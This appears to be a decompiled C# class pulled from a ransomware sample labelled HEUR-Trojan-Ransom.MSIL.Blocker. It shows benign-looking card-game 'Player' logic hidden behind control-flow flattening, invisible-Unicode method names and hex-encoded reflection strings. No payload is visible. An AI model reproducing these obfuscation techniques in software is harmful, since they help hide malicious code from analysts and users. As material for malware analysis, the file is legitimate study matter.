// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: SZGenericArrayEnumerat, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: E834FD24-872B-47C0-BFE1-9B14E3D5CFBB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-8c16cbf4df8137db774d2cb97cc386b052ca7a0b77ee1572fe7a5fc9a5a22ae0.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
      if (BaseStream != 0)
        goto label_5;
label_1:
      int num1 = -922416451;
label_2:
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -647878880)) % 11U)
        {
          case 0:
            num1 = (int) num2 * -616861002 ^ -1119295385;
            continue;
          case 1:
            num1 = (int) num2 * 1678017176 ^ -1118274026;
            continue;
          case 2:
            num1 = (int) num2 * -68044625 ^ 1552120855;
            continue;
          case 3:
            str1 = "476574456E756D657261746F7264";
            num1 = (int) num2 * 1982195714 ^ 1769520291;
            continue;
          case 4:
            str2 = str1;
            num1 = -1538782038;
            continue;
          case 6:
            str1 = "766D4779";
            num1 = (int) num2 * -1132826652 ^ 484858861;
            continue;
          case 7:
            goto label_5;
          case 8:
            goto label_1;
          case 9:
            num1 = (int) num2 * -776218189 ^ -1701269157;
            continue;
          case 10:
            num1 = (int) num2 * -1271534955 ^ -42642185;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
label_5:
      num1 = BaseStream == 1 ? -1026806241 : (num1 = -1817611511);
      goto label_2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = 1559575120;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ 1813372888)) % 5U)
        {
          case 1:
            num1 = (int) num3 * -1112898208 ^ 585391568;
            continue;
          case 2:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * -1670985592 ^ -396464830;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 3:
            num4 = 0;
            break;
          case 4:
            goto label_1;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = 1108229875;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
        int[] planningCards = this.PlanningCards;
label_1:
        int num2 = -1178482405;
        int index;
        int num3;
        bool flag;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ -768973039)) % 11U)
          {
            case 0:
              planningCardsCount = num1;
              num2 = (int) num4 * 99094563 ^ 2033799565;
              continue;
            case 1:
              num3 = planningCards[index];
              num2 = -127987942;
              continue;
            case 2:
              num2 = (int) num4 * -1625058322 ^ 1745181548;
              continue;
            case 3:
              index = 0;
              num2 = (int) num4 * 573688625 ^ -2058642770;
              continue;
            case 4:
              ++num1;
              num2 = (int) num4 * 2061002314 ^ 212134404;
              continue;
            case 6:
              int num5;
              num2 = num5 = index < planningCards.Length ? -1186052216 : (num5 = -2008765867);
              continue;
            case 7:
              ++index;
              num2 = -1438406844;
              continue;
            case 8:
              goto label_1;
            case 9:
              int num6 = flag ? 77143066 : (num6 = 258635938);
              num2 = num6 ^ (int) num4 * -13826095;
              continue;
            case 10:
              flag = num3 > 0;
              num2 = (int) num4 * 1513666503 ^ 730590712;
              continue;
            default:
              goto label_12;
          }
        }
label_12:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = 1436069099;
      int planningCard;
      string str1;
      int index;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1565997775)) % 12U)
        {
          case 0:
            int num3 = planningCard == 0 ? -1723657396 : (num3 = -163210316);
            num1 = num3 ^ (int) num2 * 30996912;
            continue;
          case 1:
            ++index;
            num1 = 634912444;
            continue;
          case 2:
            int num4 = !flag ? 172256381 : (num4 = 124668360);
            num1 = num4 ^ (int) num2 * -965631943;
            continue;
          case 3:
            num1 = (int) num2 * 26197830 ^ -579092624;
            continue;
          case 4:
            str2 = str1;
            num1 = (int) num2 * 518216330 ^ -1404476375;
            continue;
          case 5:
            planningCard = this.PlanningCards[index];
            num1 = 1886707239;
            continue;
          case 7:
            flag = index < this.PlanningCards.Length;
            num1 = 1566417365;
            continue;
          case 8:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * -1764526205 ^ -1408519343;
            continue;
          case 9:
            goto label_1;
          case 10:
            num1 = (int) num2 * 582247368 ^ 1433609644;
            continue;
          case 11:
            str1 = Player.\u202C⁮‬⁫‮‍‪‪‎‌‌‮‬​‭⁫⁪⁪‏‮‌‎⁮⁪‭‭​⁯‏⁯‪‎⁬‏‍⁬⁮‭‫⁬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 848064162;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -746492919;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1719704376)) % 3U)
        {
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -464863577 ^ 141614485;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 102116374;
      int[] numArray;
      int[] planningCards;
      int aIndex;
      int count;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1224984992)) % 9U)
        {
          case 0:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 1065406619;
            continue;
          case 1:
            count = json.Count;
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * -289753083 ^ 627898435;
            continue;
          case 2:
            num1 = (int) num2 * 874049439 ^ 627960306;
            continue;
          case 3:
            int num3;
            num1 = num3 = aIndex < count ? 278396599 : (num3 = 95737696);
            continue;
          case 4:
            planningCards = numArray;
            num1 = (int) num2 * 111255341 ^ 178166461;
            continue;
          case 5:
            num1 = (int) num2 * 462881042 ^ -356834732;
            continue;
          case 6:
            ++aIndex;
            num1 = (int) num2 * 1953761708 ^ 1594509029;
            continue;
          case 8:
            goto label_1;
          default:
            goto label_10;
        }
      }
label_10:
      return planningCards;
    }

    public override string ToString() => Player.\u206E‬‭‏⁫‎‬‪‫⁪⁫⁭‬‬⁭‌‬⁬⁫‌‫⁫‍‌‎‏‎‫⁭⁭‏⁯‮‪‪‌‮‭‌⁮‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);

    static string \u202C⁮‬⁫‮‍‪‪‎‌‌‮‬​‭⁫⁪⁪‏‮‌‎⁮⁪‭‭​⁯‏⁯‪‎⁬‏‍⁬⁮‭‫⁬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206E‬‭‏⁫‎‬‪‫⁪⁫⁭‬‬⁭‌‬⁬⁫‌‫⁫‍‌‎‏‎‫⁭⁭‏⁯‮‪‪‌‮‭‌⁮‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
